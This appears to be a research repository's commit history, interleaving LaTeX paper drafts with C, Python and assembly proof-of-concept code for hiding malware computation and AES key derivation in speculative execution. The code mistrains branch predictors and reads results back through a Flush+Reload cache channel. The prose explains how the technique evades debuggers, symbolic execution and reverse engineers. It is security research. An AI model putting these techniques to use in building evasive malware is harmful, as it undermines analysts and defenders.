+\subsubsection{Full Whitebox Cryptography}
+To make it difficult to extract the key schedule used to decrypt the ciphertext,
+we can preload a large block of random data, and have multiple speculative entry
+points, each that choose a different index into the random data to be used as
+the key schedule, and then jumps to a common decryption routine. This way, the exact
+speculative entry point determines the key used for decryption. Because the
+exact speculative entry point is determined by the trigger program, an analyst
+cannot discover the decryption key directly from the payload program.
+
+An analyst could enumerate potential entry points, and test each one
+until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
+there are (at most) only about 1~million entry points, providing just 20~bits of
+security.
+
+To increase security, we could \emph{chain} entry points together. Rather than
+derive the index from the entry point, we have each potential entry point perform
+another indirect jump that the CPU cannot immediately resolve, forcing it to 
+speculate, inside the speculative world. The predicted
+target of that jump will also be determined by the trigger program. For
+instance, if the trigger program makes 30 training jumps, followed by 10
+additional jumps, the payload program will follow all 40 jumps, with the
+locations of the last 10 jumps used to determine the key index information.
+If each jump could land in up to 1024 possible locations, this would provide in
+total $1024^10 = 2^100$ possible keys, or 100~bits of security.
+
+A payload can still be crafted to use a benign program, given that it 
+implements a sufficient series of jumps. Even if a reverse engineer 
+gets to watch the program run they will only find out the plain text 
+and not the key schedule as any attempts to observe the decryption 
+process will interfere with the speculative branching. The reverse enginner 
+must either identify the exact process that was running concurently 
+which trained the branch predictor, or identify the correct series of 
+jumps taken speculatively to derive the key schedule.
+
+We believe that the state explosion provided in both of these scenarios 
+presents new and difficult challenges for reverse engineers.
+
+\subsubsection{Multiple Triggers}
+To create further difficulties for a reverse engineer, or to further target
+the execution environment in which a sample executes it is possible
+to have the payload program test a series of separate jump patterns. The decryption
+process can then be done in stages where the result of a given stage determines 
+the initial state of the next decryption stage that the payload program 
+performs. Only when all triggers have been completed in the correct order will
+the true plaintext be available.
+
+While this would increase the difficulty for a reverse engineer who has access
+to a sample in isolation, it  does not add any extra layers of complication 
+for reverse engineers who can observe the entire decryption process. Any state 
+encoded in the real world during the individual stages will be available to current 
+debugging tools. This allows reverse engineers start the sample from the initial
+state of any stage in subsequent runs. For example, they could patch the 
+binary to begin with the state of the final stage such that only the final 
+trigger must be run again to retreive the plaintext. While this simplifies the 
+job of acquiring the plaintext of a given \speculake sample, it does not give any 
+information about the trigger programs or the key schedules used.
+
 %%%%%%%%%%%%%%

### 2018-05-06 entropy/gen-chain.py
boom, 10-layers deep speculative decryption

@@ -61,7 +61,6 @@ print '''
 # But the speculative world doens't live that long,
 # So we'll just use aesenc.
 
-.section .encrypt, "ax"
   .global encrypt
 encrypt:
     # Derive %xmm0...10 from %xmm0
@@ -170,14 +169,24 @@ if not(PAYLOAD):
 else:
     # Payload cache side channel
     print '  # This is payload:'
-    print '  mov $0x480000, %rdx    # probe_buf'
-    print '  mov $0x480010, %rbx    # cur_probe_space'
+    print '  mov 0x480000, %rdx    # probe_buf'
+    print '  mov 0x480010, %rbx    # cur_probe_space'
     print '  imul %rax, %rbx        # cur_probe_space*pt_byte'
     print '  add %rbx, %rdx         # +probe_buf'
     print '  mov (%rdx),%rax        # load something in cache'
     print '  nop                    # celebratory nop'
     print '  retq                   # in case you actually called this'
 
+
+
+print '''
+
+
+.global end_targets
+end_targets:
+    nop
+
+'''
 
 if PAYLOAD:
     ##########

### 2018-05-06 entropy/measure.c

@@ -46,21 +46,6 @@ uint64_t tot_time = 0;      // Number cycles total
 unsigned int junk=0;    // For rdtscp
 
 
-void *map;
-#define TARGET_FN_ADDR 0x414100401000
-
-// We define this function in assembly (target_fn.S)
-// It is never called directly (essentially dead code)
-// However, indirect.c trains the processor to think the indirect
-// jump in common.c::indirect() is going to call this function
-// We flush the fn_ptr used by indirect(), forcing the CPU to
-// (mis)speculate and start processing this function.
-// In reality, the CPU will (eventually) call check_probes()
-// where we collect results and see what's in cache
-void target_fn(void) __attribute__((section(".targetfn")));
-void end_target_fn(void);
-void end_target_fn2(void);
-
 uint64_t results[NUM_PROBES];
 
 void check_probes() {
@@ -97,6 +82,8 @@ void nop ()
 }
 
 void setup_indirect(uint64_t ctr);
+void targets();
+void end_targets();
 
 void measure() {
     fn_ptr = check_probes;
@@ -110,8 +97,7 @@ void measure() {
         for (i=0; i<2000; i++) {
             _mm_clflush(&fn_ptr);
             //_mm_clflush(&jmp_ptr);
-            //indirect(&jmp_ptr);
-            setup_indirect(0);
+            setup_indirect(signal_idx);
             usleep(1);
         }
         uint64_t avg = 0;
@@ -126,8 +112,8 @@ void measure() {
         }
 
         if (max_res > 10 && avg < 55){
-            printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
-                     max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
+            printf("'%c' [%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
+                     (char)max_i, max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
             avgpct += ((float)max_res)/tot_runs;
 
             last_i = max_i;
@@ -176,6 +162,10 @@ int main()
 
 
     // TODO: Don't forget to load code into icache!!!
+    volatile uint8_t *p = (void*)targets;
+    while (p < (uint8_t*)end_targets) {
+        *p++;
+    }
 
 
     measure();

### 2018-05-06 paper/implementation.tex

@@
 To acheive a balance with speed the number of bits in each instruction is both 
-fixed and minimized.  A variable length instruction would require that the prime
-and probe stage search the maximum number of bits on each round, and each 
-aditional bit doubles the search space that the prime and probe stage must 
+fixed and minimized.  A variable length instruction would require that the 
+\texttt{Flush+Reload} stage search the maximum number of bits on each round, and each 
+aditional bit doubles the search space that the \texttt{Flush+Reload} stage must 
 traverse.  So every bit shorted effectively doubles the throughput of the 
@@
 Expected performance for a given SPASM binary will vary given multiple factors, 
-the most important of which is the prime and probe redundancy. This can be tuned
+the most important of which is the \texttt{Flush+Reload} redundancy. This can be tuned
 based on the specific trigger, as it is used to establish confidence that a signal 

### 2018-05-06 entropy/gen-chain.py
a bit of cleanup

@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 
-NUM_ROUNDS = 10
+NUM_ROUNDS = 16
 BYTES_PER_ROUND = 1
 NUM_LANDINGS = 2**(BYTES_PER_ROUND*8)
 
@@ -20,7 +20,7 @@ print '.section .targets, "ax"'
 print '  .global targets'
 print 'targets:'
 
-targets_offset = 0x510000
+targets_offset = 0x990000
 addrs = []
 
 for i in xrange(NUM_LANDINGS):

### 2018-05-06 entropy/trigger.c

@@ -12,10 +12,15 @@ __uint128_t do_jumps();
 
 int idx = 0;
 
-void train(int print_key)
+void train(int print_ctext)
 {
-    fn_ptr = (void(*)(void))(0x510fd0);
-    printf("fn_ptr: %p\n", fn_ptr);
+    fn_ptr = (void(*)(void))(0x990fd0);
+    if (print_ctext) {
+        printf(".align 16\n");
+        printf(".global ctext\n");
+        printf("ctext:\n");
+    }
+
     jmp_ptr = 0;
     uint64_t ctr = 0;
     while (1) {
@@ -26,7 +31,7 @@ void train(int print_key)
         //__uint128_t register ct = do_jumps(ctr);
         uint8_t register ct = do_jumps(ctr);
 
-        if (print_key) {
+        if (print_ctext) {
             //uint64_t low = ct;
             //uint64_t high = (ct >> 64);
             //printf("  .quad 0x%016lx, 0x%016lx    # %08lx\n", high, low, ctr);
@@ -60,10 +65,10 @@ int main(int argc, char *argv[])
     }
 
     if (argv[1][0] == 'e') {
-        printf("encrypting...\n");
+        printf("# encrypting...\n");
         train(1);
     } else if (argv[1][0] == 't') {
-        printf("training...\n");
+        printf("# training...\n");
         train(0);
     }
 

### 2018-05-06 common.h
double speculate works, but the real action is in the entropy branch now. stashing this

@@ -2,6 +2,8 @@
 #define COMMON_H
 
 extern void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
+extern void __attribute__((section(".fnptr2"))) (*fn_ptr2)(void);
+extern uint64_t __attribute__((section(".jmpptr2"))) jmp_ptr2;
 void indirect(void *jmp_ptr) __attribute__((section(".indirect")));
 extern void __attribute__((section(".aliasfnptr"))) (*alias_fn_ptr)(void);
 void alias_indirect(void *jmp_ptr) __attribute__((section(".aliasindirect")));

### 2018-05-06 measure.c

@@ -59,6 +59,7 @@ void *map;
 // where we collect results and see what's in cache
 void target_fn(void) __attribute__((section(".targetfn")));
 void end_target_fn(void);
+void end_target_fn2(void);
 
 uint64_t results[NUM_PROBES];
 
@@ -89,14 +90,23 @@ void check_probes() {
     }
 }
 
+
 uint64_t jmp_ptr;
 
+void nop ()
+{
 
+}
+
+extern void target_fn2(void);
+extern void target_fn(void);
 
 void measure() {
     fn_ptr = check_probes;
+    fn_ptr2 = nop;
     //jmp_ptr = 0x400e60;
     jmp_ptr = 0;
+    jmp_ptr2 = 0;
     int i;
 
     int misses = 0;
@@ -105,7 +115,9 @@ void measure() {
     while (1) {
         for (i=0; i<2000; i++) {
             _mm_clflush(&fn_ptr);
+            _mm_clflush(&fn_ptr2);
             //_mm_clflush(&jmp_ptr);
+            //_mm_clflush(&jmp_ptr2);
             indirect(&jmp_ptr);
             //((void(*)(void *))map)(&jmp_ptr);
             usleep(1);
@@ -121,7 +133,7 @@ void measure() {
             }
         }
 
-        if (max_res > 10 && avg < 50){
+        if (max_res > 10 && avg < 55){
             printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
                      max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
             avgpct += ((float)max_res)/tot_runs;
@@ -170,9 +182,20 @@ int main()
         _mm_clflush(&probe_buf[i*cur_probe_space]);
     }
 
-    map = mmap((void*)TARGET_FN_ADDR, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
-    memcpy(map, indirect, ((uint64_t)end_indirect)-((uint64_t)indirect));
-    memcpy(map+600, target_fn, end_target_fn-target_fn);
[…]

### 2018-05-06 target_fn.c

@@ -1,5 +1,6 @@
 #include <unistd.h>
 #include <stdint.h>
+#include "common.h"
 
 extern uint8_t *probe_buf;
 extern uint64_t cur_probe_space;
@@ -21,9 +22,47 @@ void signal(uint64_t state)
 void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void)
 {
+    /*
+    register uint8_t *pb = (uint8_t*)*((uint8_t**)0x480000);  // probe_buf
+    register uint64_t cps = *((uint64_t*)0x480010);  // cur_probe_space
+    asm volatile ("mov (%%rcx), %%rax" :: "c"(&pb[13*cps]) : "rax");
+    */
+    asm volatile(
+        //"movabs    $0x460000, %%rbx\n"
+        "movabs     $0x450000, %%rbx\n"
+        //"add (%%rbx), %%rax\n"
+        "callq *%%rax\n" :::"rax","rbx");
+
+}
+
+void end_target_fn(void) __attribute__((section(".targetfn")));
+void end_target_fn(void) {
+}
+
+
+void target_fn2(void) __attribute__((section(".targetfn2")));
+void target_fn2(void)
+{
+
+
+    signal(18);
     //signal(11);
-    asm volatile("idiv %%rbx\n":: "d"(0x00), "a"(0x12341234), "b"(0x1235):);
-    asm volatile("idiv %%rbx\n":: "d"(0x00), "a"(0x12341234), "b"(0x1235):);
+    //asm volatile("idiv %%rbx\n":: "d"(0x00), "a"(0x123), "b"(0x7):);
+
+    /*
+    asm volatile("idiv %%ebx\n":: "d"(0x00), "a"(0x123), "b"(0x7):);
+    asm volatile("idiv %%ebx\n":: "d"(0x00), "a"(0x123), "b"(0x7):);
+    asm volatile("idiv %%ebx\n":: "d"(0x00), "a"(0x123), "b"(0x7):);
+    asm volatile("idiv %%ebx\n":: "d"(0x00), "a"(0x123), "b"(0x7):);
+
+    asm volatile("idiv %%ebx\n":: "d"(0x00), "a"(0x123), "b"(0x7):);
+    asm volatile("idiv %%ebx\n":: "d"(0x00), "a"(0x123), "b"(0x7):);
[…]

### 2018-05-06 trigger.c

@@ -14,22 +14,45 @@
  * in the "victim" process we are trying to
  * (mis)train the processor's BTB to call
  */
+
+
+void target_fn2(void) __attribute__((section(".targetfn2")));
+void target_fn2(void)
+{
+
+}
+
+
 void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void) {
+    asm volatile(
+        //"movabs    $0x460000, %%rbx\n"
+        "movabs     0x450000, %%rax\n"
+        //"add (%%rbx), %%rax\n"
+        "callq *%%rax\n" :::"rax","rbx");
+
+
+    /*
+    asm volatile(
+	    "add (%%rbx), %%rax\n"
+        "callq *%%rax\n" :: "a"(fn_ptr2), "b"(&jmp_ptr2) :);
+    */
 }
 
 
 #define TARGET_FN_ADDR 0x414100401000
-uint64_t jmp_ptr;
 void *map;
+uint64_t jmp_ptr;
 
 void train()
 {
     fn_ptr = target_fn;
+    fn_ptr2 =target_fn2;
     //fn_ptr = map+600;
     printf("fn_ptr: %p\n", fn_ptr);
     //jmp_ptr = 0x400e60;
     jmp_ptr = 0;
+    jmp_ptr2 = 0;
     while (1) {
         _mm_clflush(fn_ptr);
         _mm_clflush(&jmp_ptr);
@@ -48,6 +71,7 @@ int main(int argc, char *argv[])
 
     printf("training...\n");
 
+    /*
     uint64_t base = TARGET_FN_ADDR;
     if (argc > 1) {
         base = strtoll(argv[1], NULL, 16);
@@ -62,7 +86,7 @@ int main(int argc, char *argv[])
 
     // Set it to just immediately return (retq = 0xc3)...
     memset(map+600, '\xc3', 1);
-
+    */
 
     train();
 

### 2018-05-06 paper/architecture.tex
partial related work, and bib fixes across paper

@@
 We also measured the capacity of the reorder buffer (ROB) using a method
-outlined by~\cite{intel-rob-capacity}. We measure the maximum number of cycles taken to
+outlined by~\cite{measuring-rob}. We measure the maximum number of cycles taken to
 perform two uncached memory reads, and vary the number of filler instructions
@@
 bits) and the time it takes the real world to recover the result from the side
-channel. Using Flush+Reload~\cite{flush-reload} as our cache side channel,
+channel. Using Flush+Reload~\cite{yarom2014flush+} as our cache side channel,
 recovering the result requires accessing all elements in an array exponential in

### 2018-05-06 paper/discussion.tex
partial related work, and bib fixes across paper

@@
 that using the \texttt{rep} instruction caused $2n$ $\mu$ ops when the string
-operation works on $n$ bytes. Thus enough repetitions would cause instructions
+operation works on $n$ bytes~\cite{uop_article}. Thus enough repetitions would cause instructions
 after the \texttt{rep} instruction to wait for the full repetition to be retired

### 2018-05-06 paper/related-work.tex
partial related work, and bib fixes across paper

@@
 
-This work makes use of ideas spanning multiple computer science and computer
-security disciplines.
+% This work makes use of ideas spanning multiple computer science and computer
+% security disciplines.
 
-\subsection{CPU Reverse Engineering}
+\subsection{Spectre}
+
+% Lead in 
 Leading up to the discovery and release of the Spectre and Meltdown vulnerabilities
 multiple teams were working to reverse engineer the mechanisms that implemented in 
-the microcode of various processors.
+the microcode of various processors. As early as 2013 attempts to learn about the size 
+of the re-order buffer were using cache timing side channels very similar to the 
+Spectre variants~\cite{measuring-rob}.
 
-\subsection{Weird Machines}
+% Discovery
+Multiple teams discovered the Spectre vulnerabilites concurrently including the 
+various teams associated with Kocher \textit{et al.}~\cite{spectre}, the Project Zero team 
+at Google~\cite{project_zero},and numerous others~\cite{}.
 
-\subsection{Red Pills}
+% Follow Up
+The Spectre variants have been used in many other attacks on security critical 
+including
+
+% defenses 
+Much like cache side channel vulnerabilities speculative execution is relatively
+critical to processor performance and requires significant software, and hardware 
+updates to fully address. Multiple measures have been proposed to address the 
+individial variants of Spectre. Retpoline is Google's in house fix for enforcing 
+isolation against branch target injection attacks~\cite{retpoline}. \textbf{Someone} 
+\textit{et al.} propose that
+
+We can certainly look forward to more vulnerabilities relating to speculative 
+branching and related hardware side channels. Our work represents an exploit 
+model for these vulnerabilities reliant upon shared hardware resources.
+
+\subsection{Weird Machines \& Red-Pills}
+Hardware side effects often leave behind unexpected state transitions 
+that are not, or cannot be, accounted for in modeling environments. Malware
+has historically made use of these bugs to create "weird" models of 
+computation~\cite{weird_machines}. These state transitions can also leak 
+information about the environment in which a program is running, which 
+malware has used to avoid honey-pots and emulated environments.
+
+The term \textit{weird machine} comes from work done by Bratus \textit{et al.}
+composing bugs and features of a system to create arbitrary compuatation with 
+interesting properties~\cite{weird_machines,bratus2011exploit}. This 
+encompasses many traditional computer vulnerabilities including 
+buffer overflow~\cite{buffer_overflow}, format string exploits~\cite{format_string_exploit}, 
+and return oriented programming~\cite{shacham2007geometry} to name only a few.
+
+Bangert~\textit{et al.} demonstrate that a turing complete weird machine 
+can be constructed using the page fault handling mechanism in Intel's
+IA32 architecture~\cite{bangert2013page}. Bugs like this are abundant in
+modern processors as multiple processes share system resources cooperatively
+and optimizations and agregation are done objectively with regards of the 
+process for the most part. Accessing copoerative hardware resources is at
+the heart of the \speculake model, which constructs a hardware weird machine
+using speculative branching and \texttt{Flush+Reload}. This is 
+very much in the spirit of traditional exploit creation~\cite{weird_exploits}.
+
+\smallskip
+
+Similarly hardware bugs have been used to identify and fingerprint execution
+environments, in malware this is know as a red-pill~\cite{red-pill}. This can be used 
+to ensure that malware is not being emulated in a debugging 
+environment~\cite{lindorfer2011detecting, balzarotti2010efficient}. Paleari 
+\textit{et al.} automate the process of discovering red-pills by applying 
+fuzzing techniques to emulated environmenta and identifying situations 
+in which the emulators differ from their physical counterparts~\cite{paleari2009fistful}.
+This is still by no means an exhaustive list of red-pills for a given 
+processor as many rely on timing or race conditions in physical 
+environments.
+
+% Hardware bare-metal analysis
+To combat this Kirat \textit{et al.} propose the use of automated "bare-metal" 
+emulation of malware~\cite{kirat2011barebox}, and methods to determine if malware
+is performing red-pill checks to avoid emulation environments~\cite{kirat2014barecloud}.
+This can also be combatted using symbolic execution by finding environmental triggers 
+in malicious binaries~\cite{schwartz2010all}.
+
+\smallskip
+
+Unlike other red-pills based on hardware bugs, \speculake cannot be bypassed
+by patching binaries as the speculation can only happen on "bare-metal" systems, 
+and break points will fail to trigger on a speculative call to a specific function.
+Symbolic execution will also fail to find a target function as it is never on the 
+execution pathway.
 
@@
 
+The \speculake model relies critically on cache side channel attacks to 
+communicate information from the speculative world.
+
+\texttt{Flush+Reload}~\cite{yarom2014flush+}
+
+Prime+Probe technique has been used against a number of processors
+at multiple different leverls of cache. L1 data cache~\cite{} 
+L2 cache~\cite{}
+branch prediction cache~\cite{}
+L1 instruction cache~\cite{}. These attacks have also been performed 
+in cloud environments~\cite{}, collocated VMs~\cite{}, and local
+environments~\cite{}.
+
+While other works have demonstrated higher throughput from similar 
+covert cache side channels~\cite{}, we incurr slightly higher performance 
+penalties in our implementation as we perform redundancy checks to 
+ensure the signal strength and cause intentional cache misses to enable
+speculative execution costing hundreds to thousands of clock cycles~\ref{fig:cache-miss}
+per round.
+
 %%%%%%%%%%%%%%

### 2018-05-06 paper/discussion.tex
pass on turing and aes architecture

--- 2018-05-05 paper/discussion.tex
@@
 
+%TODO: This is a defense to Spectre, but not to Exspectre...
 \subsubsection{SpecFence}
@@
 
+%\subsubsection{Full Whitebox Cryptography}
+%To make it difficult to extract the key schedule used to decrypt the ciphertext,
+%we can preload a large block of random data, and have multiple speculative entry
+%points, each that choose a different index into the random data to be used as
+%the key schedule, and then jumps to a common decryption routine. This way, the exact
+%speculative entry point determines the key used for decryption. Because the
+%exact speculative entry point is determined by the trigger program, an analyst
+%cannot discover the decryption key directly from the payload program.
+%
+%An analyst could enumerate potential entry points, and test each one
+%until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
+%there are (at most) only about 1~million entry points, providing just 20~bits of
+%security.
+%
+%To increase security, we could \emph{chain} entry points together. Rather than
+%derive the index from the entry point, we have each potential entry point perform
+%another indirect jump that the CPU cannot immediately resolve, forcing it to 
+%speculate, inside the speculative world. The predicted
+%target of that jump will also be determined by the trigger program. For
+%instance, if the trigger program makes 30 training jumps, followed by 10
+%additional jumps, the payload program will follow all 40 jumps, with the
+%locations of the last 10 jumps used to determine the key index information.
+%If each jump could land in up to 1024 possible locations, this would provide in
+%total $1024^10 = 2^100$ possible keys, or 100~bits of security.
+%
+%A payload can still be crafted to use a benign program, given that it 
+%implements a sufficient series of jumps. Even if a reverse engineer 
+%gets to watch the program run they will only find out the plain text 
+%and not the key schedule as any attempts to observe the decryption 
+%process will interfere with the speculative branching. The reverse enginner 
+%must either identify the exact process that was running concurently 
+%which trained the branch predictor, or identify the correct series of 
+%jumps taken speculatively to derive the key schedule. 
+%
+%We believe that the state explosion provided in both of these scenarios 
+%presents new and difficult challenges for reverse engineers.
+
+\subsubsection{Multiple Triggers}
+To create further difficulties for a reverse engineer, or to further target
+the execution environment in which a sample executes it is possible
+to have the payload program test a series of separate jump patterns. The decryption
+process can then be done in stages where the result of a given stage determines 
+the initial state of the next decryption stage that the payload program 
+performs. Only when all triggers have been completed in the correct order will
+the true plaintext be available.
+
+While this would increase the difficulty for a reverse engineer who has access
+to a sample in isolation, it  does not add any extra layers of complication 
+for reverse engineers who can observe the entire decryption process. Any state 
+encoded in the real world during the individual stages will be available to current 
+debugging tools. This allows reverse engineers start the sample from the initial
+state of any stage in subsequent runs. For example, they could patch the 
+binary to begin with the state of the final stage such that only the final 
+trigger must be run again to retreive the plaintext. While this simplifies the 
+job of acquiring the plaintext of a given \speculake sample, it does not give any 
+information about the trigger programs or the key schedules used.
+
 %%%%%%%%%%%%%%

### 2018-05-06 paper/payloads.tex

@@
 
-As a first step, we observe that this primitive can be used to trivially
+As a first step, we observe that the speculative primitive can be used to trivially
 implement a finite state machine: any logic can be done in the speculative
@@
 real world state (and other inputs), compute any state transitions, and
-communicate the result. In this mode, the state is maintained by the real world,
+communicate the next state. In this mode, the state is maintained by the real world,
 while updates are controlled by code executed speculatively.
@@
 To demonstrate that arbitrary computation can be done in the speculative world
-we create a Turing Machine to compute a 5 state Busy Beaver Turing Machine. The
-Busy Beaver game is tasked with creating a Turing Machine which writes the most
+we implement a Turing machine, configured to run the 5-state Busy Beaver function~\cite{busy-beaver}.
+The Busy Beaver is a configuration that writes the most
 1s on the tape with only a limited number of states and still halts.
@@
 \label{subsec:decryption}
-While Section \ref{subsec:turing} demonstrates that arbitrary computation is
-possible, if a reverse engineer can discover the \emph{speculative instructions}
-they can determine the execution of the program by simply reading the
-instructions that are to be executed speculatively. To avoid this these
-instructions can be encrypted, meaning that a reverse engineer can never
-determine these instructions by examining the ELF file, or generating source
-code.
 
-In order for these instructions to be executed they must be decrypted. We wish
-to obscure the fact that we are using encrypted instructions from the ``real
-world'', thus  the speculative world must do the decryption.
+Section~\ref{subsec:turing} demonstrates that arbitrary speculative computation
+is possible, but hiding malware this way has several drawbacks. First, an
+analyst might be able to observe that something is driving a Turing
+machine by noticing the real world state updating. With enough symbols, the
+analyst could reverse engineer the state machine even without being able to see
+the internal logic executing speculatively. Second, Turing machines are a
+poor choice for practical computation, as they are inefficient and have no direct
+way to perform system calls or otherwise interface externally.
+
+We explore a more practical application of using \speculake to perform
+decryption speculatively. To hide keys from the analyst, the key and decryption
+code only occur in the speculative world, while committed state only learns the
+resulting plaintext. Furthermore, the speculative code can
+derive the decryption key based entirely off the trigger program, making it
+impossible for an analyst that only has the payload program from being able to
+determine the key or decrypt the embedded ciphertext.
 
@@
 indication of decryption, due to the exploitation of speculative execution. Any
-observation of the executed instructions would not include any of the decryption
+observation of the executed instructions would not include any decryption
 instructions, or loading of keys as they are only done speculatively, and thus
 not shown in any debugging or real world traces of program execution. 
-Additionally the observer would be unable to find the executed instructions in
-the ELF file as they are only stored encrypted.
+%Additionally the observer would be unable to find the executed instructions in
+%the ELF file as they are only stored encrypted.
 
-There are numerous challenges for a reverse engineer to overcome to learn how a
-malicious program with this primitive works. As with previous examples, the
-malicious instructions are only executed when the correct trigger program is
-running (priming the jump table predictor \textbf{TK: word for this?}). However,
-when the to-be-executed instructions are executed the reverse engineer cannot
-locate these instructions in the ELF file, or generated source code. These
-instructions (when they even appear) seem to be generated by themselves, with no
-apparent cause. Additionally, there is no indicator that these instructions are
-encrypted as the decryption is done in the speculative world, meaning that no
-decryption (or key interaction) is done in a way visible to a reverse engineer.
+We note that 200 instructions is too short for most software-implemented
+cryptography. However, modern Intel CPUs provide hardware support for AES, which
+we find only takes a handful of $\mu$-ops to perform the instructions needed in
+AES decryption. We discuss details of our speculative AES decryption in
+Section~\ref{sec:impl-aes}.
 
-This method allows for arbitrary computation that is unobservable to any observer (static or dynamic).
+\medskip
+
+We note that an analyst might attempt to locate the speculative entry point by
+searching for AES-NI instructions in the payload program's dead code, ultimately
+discovering the keys that it uses. However, we find it is possible to overcome
+this by having the trigger program communicate the decryption key to the payload
+program via the branch predictor.
+
+To accomplish this, we use multiple speculative entry points, each that derive a
+different decryption key before calling a common decryption routine. Since
+the exact speculative entry point is determined by the trigger program, an
+analyst cannot discover the decryption key directly from the payload program.
+
+An analyst could still enumerate all potential entry points, testing each one
+until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
+there are (at most) only 1~million entry points, providing just 20~bits of
+security.
+
+To increase security, we \emph{chain} entry points together. Rather than derive
+the key from a single entry point, we have each potential entry point perform
+another indirect jump that the CPU cannot immediately resolve, forcing it to
+speculate while already executing speculatively. The predicted target of that jump
+will also be determined by the trigger program. For example, if the trigger
+program makes 30 training jumps, followed by 10 additional indirect jumps, and
+the payload program performs the same 30 training jumps before a stall, the CPU
+will predict the payload program will also perform the next 10 jumps. If each
+jump has the potential to land in up to 1024 possible locations, this would
+provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
+We describe our implementation of this nested speculative execution concept in
+Section~\ref{sec:impl-aes}.
+
+%There are numerous challenges for a reverse engineer to overcome to learn how a
+%malicious program with this primitive works. As with previous examples, the
+%malicious instructions are only executed when the correct trigger program is
+%running (priming the jump table predictor \textbf{TK: word for this?}). However,
+%when the to-be-executed instructions are executed the reverse engineer cannot
+%locate these instructions in the ELF file, or generated source code. These
+%instructions (when they even appear) seem to be generated by themselves, with no
+%apparent cause. Additionally, there is no indicator that these instructions are
+%encrypted as the decryption is done in the speculative world, meaning that no
+%decryption (or key interaction) is done in a way visible to a reverse engineer.
+%
+%This method allows for arbitrary computation that is unobservable to any observer (static or dynamic).
 

### 2018-05-06 iftest/if.c
add if-test

@@ -1,0 +1,266 @@
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <signal.h>
+#include <time.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "common.h"
+
+// Defines the bandwidth we can communicate
+// from speculative -> von neuman
+// e.g. 256 would be 1 byte of info
+// Tradeoff here is larger bandwidth means we have
+// to check more places in probe_buf (and flush them)
+#define NUM_PROBES 32 
+
+// These define the stride length we take between probes
+// This thwarts a clever CPU's stride prediction
+// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
+// Generally, this results in not seeing ANY winning probes
+// in which case, we change cur_probe_space and retry
+#define MAX_PROBE_SPACE (1000003)
+uint64_t cur_probe_space = 4177;
+
+
+// The (heap-allocated) probe buffer
+// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
+// in the cache to communicate the value i from speculative -> von neuman
+uint8_t *probe_buf;
+
+
+// This is a simple counter, accessed by the speculative function (target_fn)
+// so it can compute on it.
+uint64_t instr = 0;
+
+
+// Stats
+uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
+uint64_t tot_time = 0;      // Number cycles total
+uint64_t R = 1;
+uint64_t L = 0;
+#define MAX_EXPERIMENT 100
+
+unsigned int junk=0;    // For rdtscp
+
+// #define STATE4
+
+uint8_t rand_xor;
+void init_rand() {
+    srand(time(0));
+    rand_xor = (uint8_t) rand() & 0xff;
+}
+
+void *map;
+#define TARGET_FN_ADDR 0x414100401000
+
+// We define this function in assembly (target_fn.S)
+// It is never called directly (essentially dead code)
+// However, indirect.c trains the processor to think the indirect
+// jump in common.c::indirect() is going to call this function
+// We flush the fn_ptr used by indirect(), forcing the CPU to
+// (mis)speculate and start processing this function.
[…]

### 2018-05-06 iftest/if_target.c

@@ -1,0 +1,124 @@
+#include <unistd.h>
+#include <stdint.h>
+
+extern uint8_t *probe_buf;
+extern uint64_t cur_probe_space;
+extern uint64_t signal_idx;
+extern uint8_t rand_xor;
+#ifdef STATE4
+extern uint8_t lookup[2][4];
+#else
+extern uint8_t lookup[2][5];
+#endif
+
+extern uint8_t *turing_tape;
+extern uint8_t turing_state;
+
+// This will be an int 0-255 typically...
+void signal(uint64_t state)
+{
+    asm volatile ("mov (%%rcx), %%rax" :: "c"(&probe_buf[state*cur_probe_space]) : "rax");
+}
+
+
+void update_state(uint8_t write, uint8_t move_right, uint8_t state)
+{
+    // write is either 0 or 1 (for 2-symbol)
+    // move_right is 1 for R, 0 for L
+    // state is 0=A, 1=B, etc
+    // signal(((state << 2) | ((move_right&0x1) << 1) | (write & 0x1)) ^ rand_xor);
+    signal(((state << 2) | ((move_right&0x1) << 1) | (write & 0x1)));
+}
+
+#define L 0
+#define R 1
+
+void target_fn(void) __attribute__((section(".targetfn")));
+void target_fn(void){
+    // test 2 bits
+    // if ((rand_xor&0x1) == 0){
+    //     if ((rand_xor & 0x2) ==0){
+    //         // signal(0x01);
+    //         update_state(0x1, 0x0, 0x3);
+    //     } else {
+    //         // signal(0x2);
+    //         update_state(0x1, 0x1, 0x2);
+    //     }
+    // } else {
+    //     if ((rand_xor & 0x2) == 0) {
+    //         // signal(0x03);
+    //         update_state(0x0, 0x0, 0x1);
+    //     } else {
+    //         // signal(0x04);
+    //         update_state(0x0, 0x1, 0x3);
+    //     }
+    // }
+
+    // 5 first branches
+    if (rand_xor == 0){
+        update_state(0x0, 0x0, 0x0);
+    } else if (rand_xor == 1){
+        update_state(0x0, 0x0, 0x1);
+    } else if (rand_xor == 2){
[…]

### 2018-05-06 iftest/inject.c

@@ -1,0 +1,69 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <signal.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <string.h>
